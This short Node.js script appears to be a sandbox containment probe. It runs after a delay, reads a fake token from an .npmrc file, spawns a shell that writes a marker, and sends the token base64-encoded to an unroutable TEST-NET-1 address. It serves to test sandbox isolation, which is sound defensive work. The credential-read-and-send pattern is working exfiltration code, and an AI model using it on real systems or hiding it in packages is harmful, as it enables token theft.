// Harmless Spike 1 probe (see README.md). Runs only inside a gVisor container with no network.
// After the parent has exited: read the fake token, run a grandchild shell, and try to send the
// token base64-encoded to a TEST-NET-1 address (RFC 5737), which is never routed.
const fs = require("node:fs");
const net = require("node:net");
const { execFileSync } = require("node:child_process");

setTimeout(() => {
  const fakeToken = fs.readFileSync("/home/probe/.npmrc", "utf8");
  execFileSync("/bin/sh", ["-c", "echo grandchild-ran > /tmp/marker"]);
  const socket = net.connect({ host: "192.0.2.10", port: 443 });
  socket.on("error", () => {});
  socket.write(Buffer.from(fakeToken).toString("base64"));
  setTimeout(() => process.exit(0), 1000);
}, 1500);
